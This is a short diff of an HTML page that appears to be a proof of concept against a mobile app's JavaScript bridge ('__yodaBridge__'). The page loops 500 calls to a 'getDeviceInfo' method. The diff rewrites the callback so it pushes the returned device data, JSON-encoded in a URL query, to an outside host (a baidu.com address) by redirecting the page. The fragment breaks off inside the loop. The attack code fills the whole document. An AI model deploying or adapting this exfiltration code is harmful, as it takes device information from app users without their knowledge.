@@ -8,14 +8,14 @@
 <body>
 
 	<iframe src="https://ccc.kuaishou.com/"></iframe>
-	
+
   <script>
-  		function test(a) {
- 	alert(JSON.stringify(a));
-}
       // 跳转
       location.href="https://bbbb.kuaishou.com";
-      window.test=function test(a) {alert(JSON.stringify(a))};
+      window.test=function test(a) {
+      	alert(JSON.stringify(a));
+      	location.href=`https://www.baidu.com/robots.txt?a=${JSON.stringify(a)}`;
+  	};
       setTimeout(function(){
       for(let i=0; i<500; i++){
         __yodaBridge__.invokeCallback("system","getDeviceInfo",'',"test");
